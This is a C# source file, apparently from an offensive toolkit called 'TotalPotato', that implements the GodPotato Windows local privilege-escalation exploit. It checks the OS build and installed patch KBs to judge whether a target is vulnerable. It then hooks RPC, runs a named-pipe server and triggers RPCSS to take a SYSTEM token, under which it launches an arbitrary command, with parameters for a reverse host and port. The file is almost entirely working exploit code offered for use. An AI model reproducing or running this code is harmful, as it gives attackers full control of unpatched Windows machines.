using SharpToken;
using System.Management;
using System.Security.Principal;
using TotalPotato.NativeAPI;
namespace TotalPotato
{
    public class GodPotato : IPotatoes
    {
        public string Name => "GodPotato";
        public string Description => "NamedPipe Abuse";

        public void VerbosePrint(string message, ConsoleColor color = ConsoleColor.White)
        {
            Console.ForegroundColor = color;
            Console.WriteLine(message);
            Console.ResetColor();
        }

        public bool IsApplicable()
        {
            var osVersion = OSVersionHandler.GetOSVersion(); int build = osVersion.Build;
            int major = osVersion.Major;

            bool isWindows10OrLater = major >= 10;
            bool isSupportedBuild = build >= 17763 && build <= 22000;

            string[] patchKBs = new string[]
{
        "KB5015807", "KB5016616", "KB5017380", "KB5021233", "KB5022282"
};

            bool isPatched = false;

            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT HotFixID FROM Win32_QuickFixEngineering"))
                {
                    var hotfixes = searcher.Get()
                                           .Cast<ManagementObject>()
                                           .Select(hf => hf["HotFixID"]?.ToString())
                                           .Where(id => !string.IsNullOrEmpty(id))
                                           .ToList();

                    foreach (string patch in patchKBs)
                    {
                        if (hotfixes.Contains(patch, StringComparer.OrdinalIgnoreCase))
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine($"[!] Patch {patch} is installed. System likely NOT vulnerable to GodPotato.");
                            Console.ResetColor();
                            isPatched = true;
                            break;
                        }
                    }

                    if (!isPatched)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("[*] No known GodPotato patch KBs detected.");
                        Console.ResetColor();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[X] Failed to check hotfixes: {ex.Message}");
                Console.ResetColor();
            }

            return isWindows10OrLater && isSupportedBuild && !isPatched;
        }

        public bool Execute(string command, string rev_host, int port)
        {
            TextWriter ConsoleWriter = Console.Out;
            try
            {
                Console.WriteLine("[*] GodPotato exploit started...");
                GodPotatoContext godPotatoContext = new GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());

                VerbosePrint($"[*] CombaseModule: 0x{godPotatoContext.CombaseModule:x}");
                VerbosePrint($"[*] DispatchTable: 0x{godPotatoContext.DispatchTablePtr:x}");
                VerbosePrint($"[*] UseProtseqFunction: 0x{godPotatoContext.UseProtseqFunctionPtr:x}");
                VerbosePrint($"[*] UseProtseqFunctionParamCount: 0x{godPotatoContext.UseProtseqFunctionParamCount:x}");

                ConsoleWriter.WriteLine("[*] HookRPC");
                godPotatoContext.HookRPC();
                ConsoleWriter.WriteLine("[*] Start PipeServer");
                godPotatoContext.Start();

                GodPotatoUnmarshalTrigger storageTrigger = new GodPotatoUnmarshalTrigger(godPotatoContext);
                try
                {
                    ConsoleWriter.WriteLine("[*] Trigger RPCSS");
                    int hr = storageTrigger.Trigger();
                    ConsoleWriter.WriteLine("[*] UnmarshalObject: 0x{0:x}", hr);

                }
                catch (Exception e)
                {
                    ConsoleWriter.WriteLine(e);
                }


                WindowsIdentity systemIdentity = godPotatoContext.GetToken();
                if (systemIdentity != null)
                {
                    ConsoleWriter.WriteLine("[*] CurrentUser: " + systemIdentity.Name);
                    TokenuUils.createProcessReadOut(Console.Out, systemIdentity.Token, command);

                }
                else
                {
                    ConsoleWriter.WriteLine("[!] Failed to impersonate security context token");
                }
                godPotatoContext.Restore();
                godPotatoContext.Stop();
                return true;
            }
            catch (Exception e)
            {
                ConsoleWriter.WriteLine("[!] " + e.Message);
                return false;

            }

        }

    }
}